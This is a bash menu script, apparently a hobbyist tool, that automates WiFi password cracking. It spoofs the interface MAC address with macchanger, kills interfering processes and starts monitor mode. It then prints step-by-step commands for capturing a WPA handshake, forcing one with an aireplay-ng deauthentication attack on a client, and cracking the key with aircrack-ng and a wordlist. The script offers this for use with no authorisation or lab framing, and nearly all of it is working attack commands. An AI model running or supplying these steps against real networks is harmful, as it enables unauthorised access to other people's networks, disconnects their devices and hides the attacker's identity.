#!/bin/bash

 LG='\033[1;32m' #light green
 NC='\033[0m' #no color


 
 switch=""

 printf "\n ${LG}1. Restart Network${NC}\n"
 printf "\n ${LG}2. Crack WiFi${NC}\n"
 printf "\n ${LG}3. Exit${NC}\n"
 printf "\n"
 read -p "Select an option: " switch
 case "$switch" in
 "1")
	 ifconfig
 
	 i=20
	 while [ $i != 0 ]
	 do
	 printf "${LG}..${NC}" 
	 sleep 0.03
	 i=`expr $i - 1`
	 done
	
	 printf "\n\n"
	 #Reading devicename
	 devname="USER INPUT"
	 read -p "Enter devicename: " devname
	 

	printf "\n ${LG}network-manager restarting${NC}\n"

	service network-manager restart

	airmon-ng stop "$devname"
	
	sleep 1

	echo  -e "\n ${LG}Monitoring stop${NC}\n"

	echo -e "\n ${LG}Done${NC}\n"

	;;

 "2")
	 printf "${LG}${NC}" 

	 printf "${LG}README \n${NC}" 
	 printf "${LG}...........................................${NC}\n"	
	 printf "\n${LG}Do the following after dumping.\n\n${NC}" 
	 printf "airodump-ng -c channel --bssid MAC -w /root/Desktop/ mon0 \n\n" 
	 printf "${LG}  Replace "channel" with channel number.\n  Replace "MAC" with the MAC address.\n  Replace "mon0" with your interface name.\n${NC}" 
	 printf "${LG}  Example.\n  airodump-ng -c 3 --bssid 1C:1C:1E:C1:AB:C1 -w /root/Desktop/ wlan0mon \n${NC}" 	 
	 printf "${LG}\nWait for a handshake or force handshake using deauth attack \n${NC}"
	 printf "${LG}To force handshake do the following.${NC}\n" 
	 printf "${LG}Enter the following code in a new tab.${NC}" 
	 printf "\n\naireplay-ng -0 2 -a (router bssid) -c (client station number) mon0\n" 
	 printf "\n${LG}  Example.\n  aireplay-ng -0 2 -a 04:1E:64:98:96:AB -c 54:4E:85:46:78:EA mon0${NC}\n" 
	 printf "\n${LG}Go back to previous tab and crack the password.${NC}\n"
	 printf "\naircrack-ng -a2 -b (router bssid) -w (path to wordlist) /Root/Desktop/*.cap\n"  
	 printf "\n${LG}  Example.\n  aircrack-ng -a2 -b 04:1E:64:98:96:AB -w /usr/share/wordlists/fern-wifi/common.txt /Root/Desktop/*.cap${NC}\n" 	 
	 printf "\n${LG}Wait for it to finish.${NC}\n" 
 	 printf "\n"
 	 printf "\n"
 	 sleep 2

	 ifconfig
 
	 i=20
	 while [ $i != 0 ]
	 do
	 printf "${LG}..${NC}" 
	 sleep 0.03
	 i=`expr $i - 1`
	 done
	
	 printf "\n"
	 #Reading devicename
	 devname="USER INPUT"
	 read -p "Enter devicename: " devname
	 mdevname=$devname"mon" 

	
	 i=10
	 while [ $i != 0 ]
	 do
		printf "${LG}..${NC}" 	
		sleep 0.08
 		i=`expr $i - 1`
	 done
	 
	 printf  "\n ${LG}Changing MAC${NC} \n"
	 ifconfig $devname down
	 sleep 1
	 macchanger -r $devname
	 sleep 1
	 ifconfig $devname up
	
	 i=10
	 while [ $i != 0 ]
	 do
		printf "${LG}..${NC}" 
		sleep 0.19
	 	i=`expr $i - 1`
	 done

	 printf "\n ${LG}process killing${NC} \n"
	 airmon-ng check kill
	
	 
	 i=10
	 while [ $i != 0 ]
	 do
		printf "${LG}..${NC}" 
		sleep 0.4
	 	i=`expr $i - 1`
	 done
	
	
	 printf " \n ${LG}Starting $devname monitor${NC} \n"
	 airmon-ng start $devname
		 
	 i=10
	 while [ $i != 0 ]
	 do
		printf "${LG}..${NC}" 
		sleep 0.4
	 	i=`expr $i - 1`
	 done
	
	
	 printf "\n ${LG}Dumping${NC} \n"
	
	 i=10
	 while [ $i != 0 ]
	 do
		printf "${LG}..${NC}" 
		sleep 0.1
	 	i=`expr $i - 1`
	 done
	 printf "\n"
	 airodump-ng $mdevname
	
	;;
 "3")
	exit 1
	;;
 *)
	printf "\n ${LG}Incorrect option${NC}\n"
	;;

esac
